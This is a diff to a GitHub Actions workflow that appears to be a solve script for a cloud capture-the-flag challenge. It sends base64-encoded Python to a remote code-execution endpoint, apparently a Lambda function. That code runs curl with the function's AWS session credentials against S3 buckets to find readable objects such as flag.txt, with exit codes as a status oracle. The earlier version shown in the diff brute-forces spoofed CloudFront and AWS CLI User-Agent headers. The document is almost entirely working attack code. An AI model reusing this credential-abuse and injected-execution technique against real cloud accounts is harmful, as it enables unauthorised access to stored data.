@@ -1,4 +1,4 @@
-name: Stage2-05-UserAgent-Matrix
+name: Stage2-06-S3-Get-Test
 
 on:
   push:
@@ -23,7 +23,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test User-Agent candidates
+      - name: Test S3 GET from Lambda
         run: |
           python3 - <<'PY'
           import os
@@ -39,51 +39,34 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          user_agents = [
-              "Amazon CloudFront",
-              "CloudFront",
-              "cloudfront",
-              "aws-cli",
-              "AWS CLI",
-              "aws-sdk-python",
-              "Boto3",
-              "botocore",
-              "curl",
-              "REDACTED",
-              "CloudEscape",
-              "CloudEscape-Agent",
-              "corgi",
-              "Ilayzandani",
-              "Mozilla/5.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
+          tests = [
+              ("userad88e2b168aa387e", "flag.txt"),
+              ("userad88e2b168aa387e", "index.html"),
+              ("userad88e2b168aa387e", "docs.html"),
+              ("logad88e2b168aa387e", "flag.txt")
           ]
 
-          buckets = [
-              "userad88e2b168aa387e",
-              "logad88e2b168aa387e"
-          ]
-
-          for user_agent in user_agents:
-              for bucket in buckets:
-                  code = f'''
+          for bucket, key in tests:
+              code = f'''
           import os
           import subprocess
 
-          url = "https://s3.us-east-1.amazonaws.com/{bucket}/flag.txt"
+          url = "https://s3.us-east-1.amazonaws.com/{bucket}/{key}"
 
           command = [
               "curl",
               "--silent",
               "--show-error",
-              "--head",
+              "--output",
+              "/tmp/object_result",
+              "--write-out",
+              "%{{http_code}}",
               "--aws-sigv4",
               "aws:amz:us-east-1:s3",
               "--user",
               os.environ["AWS_ACCESS_KEY_ID"] + ":" + os.environ["AWS_SECRET_ACCESS_KEY"],
               "-H",
               "x-amz-security-token: " + os.environ["AWS_SESSION_TOKEN"],
-              "-A",
-              {user_agent!r},
               url
           ]
 
@@ -94,31 +77,30 @@ jobs:
               text=True
           )
 
-          output = result.stdout + result.stderr
+          status = result.stdout.strip()
 
-          if " 200 " in output or " 206 " in output:
+          if status.startswith("2"):
               raise SystemExit(7)
 
-          if " 403 " in output or "AccessDenied" in output:
+          if status == "403":
               raise SystemExit(10)
 
-          if " 404 " in output or "NoSuchKey" in output:
+          if status == "404":
               raise SystemExit(12)
 
           raise SystemExit(19)
           '''
 
-                  encoded = base64.b64encode(code.encode()).decode()
+              encoded = base64.b64encode(code.encode()).decode()
 
-                  response = requests.post(
-                      os.environ["API_URL"],
-                      json={"code": encoded},
-                      auth=auth,
-                      timeout=40
-                  )
+              response = requests.post(
+                  os.environ["API_URL"],
+                  json={"code": encoded},
+                  auth=auth,
+                  timeout=40
+              )
 
-                  print(f"UA={user_agent}")
-                  print(f"BUCKET={bucket}")
-                  print(response.text)
-                  print("---")
+              print(f"BUCKET={bucket} KEY={key}")
+              print(response.text)
+              print("---")
           PY
